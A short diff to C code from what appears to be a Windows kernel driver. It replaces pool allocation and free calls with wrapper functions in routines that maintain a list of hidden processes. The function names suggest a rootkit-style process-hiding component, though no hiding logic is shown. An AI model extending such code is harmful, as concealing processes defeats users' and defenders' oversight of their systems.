@@ -62,7 +62,7 @@ NTSTATUS PsListHiddenAdd(
     NTSTATUS	   NtStatus = STATUS_SUCCESS;
 
     /* allocate memory for linked list object */
-    if ( ! ( PsHidden = ExAllocatePool2( POOL_FLAG_NON_PAGED, sizeof( PSHIDDEN_LIST ), RS_POOL_TAG_PSHD ) ) ) {
+    if ( ! ( PsHidden = RsMemAlloc( sizeof( PSHIDDEN_LIST ) ) ) ) {
         PRINTF( "ExAllocatePool2 Failed" );
         NtStatus = STATUS_UNSUCCESSFUL;
         goto END;
@@ -128,7 +128,7 @@ NTSTATUS PsListHiddenRemove(
 
             /* free memory */
             RtlSecureZeroMemory( PshdEntry, sizeof( PSHIDDEN_LIST ) );
-            ExFreePool2( PshdEntry, RS_POOL_TAG_PSHD, NULL, 0 );
+            RsMemFree( PshdEntry );
 
             /* set status as successful */
             NtStatus = STATUS_SUCCESS;
